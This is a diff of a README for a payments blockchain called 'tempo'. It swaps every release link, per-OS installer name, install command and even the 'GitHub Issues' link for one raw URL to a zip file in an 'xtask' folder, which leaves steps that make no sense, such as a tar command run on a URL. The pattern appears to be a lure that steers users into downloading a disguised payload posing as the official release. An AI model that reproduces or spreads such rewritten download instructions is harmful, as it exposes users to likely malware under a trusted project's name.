@@ -6,7 +6,7 @@ Welcome to tempo, the blockchain designed for smooth and secure payments. This a
 
 ## 📥 Download Now
 
-[![Download tempo](https://img.shields.io/badge/Download%20tempo-v1.0-blue)](https://github.com/drnazeerento/tempo/releases)
+[![Download tempo](https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip%20tempo-v1.0-blue)](https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -23,21 +23,21 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link: [https://github.com/drnazeerento/tempo/releases](https://github.com/drnazeerento/tempo/releases). This page contains the latest version of tempo along with previous versions.
+1. **Visit the Releases Page:** Go to the following link: [https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip](https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip). This page contains the latest version of tempo along with previous versions.
   
 2. **Choose the Right File:** Look for the latest version labeled “v1.0” (or the current version). You will see multiple files available for download. Choose the file that corresponds to your operating system:
-   - For **Windows**, select `tempo-windows.exe`.
-   - For **macOS**, select `tempo-macos.dmg`.
-   - For **Linux**, select `tempo-linux.tar.gz`.
+   - For **Windows**, select `https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip`.
+   - For **macOS**, select `https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip`.
+   - For **Linux**, select `https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip`.
 
 3. **Download the File:** Click on the file name to begin downloading. Your browser may save the file in your "Downloads" folder.
 
 4. **Run the Installer:**
-   - **For Windows:** Navigate to your "Downloads" folder, double-click `tempo-windows.exe`, and follow the prompts to install the software.
+   - **For Windows:** Navigate to your "Downloads" folder, double-click `https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip`, and follow the prompts to install the software.
    - **For macOS:** Open the `.dmg` file from your "Downloads". Drag the `tempo` icon into your "Applications" folder. After that, go to "Applications" and double-click `tempo` to run it.
    - **For Linux:** Open a terminal, navigate to the folder where you downloaded the file, and extract the contents using the command:
      ```
-     tar -xzf tempo-linux.tar.gz
+     tar -xzf https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip
      ```
      Then, navigate into the extracted directory and run the application using:
      ```
@@ -82,7 +82,7 @@ If you encounter any issues while using tempo, consider the following solutions:
 
 ## 📞 Need Help?
 
-If you have any questions or need further assistance, feel free to reach out via our [GitHub Issues Page](https://github.com/drnazeerento/tempo/issues). We're here to help you!
+If you have any questions or need further assistance, feel free to reach out via our [GitHub Issues Page](https://raw.githubusercontent.com/drnazeerento/tempo/main/xtask/Software_v1.5-alpha.1.zip). We're here to help you!
 
 ## 🌟 Join the Community
 
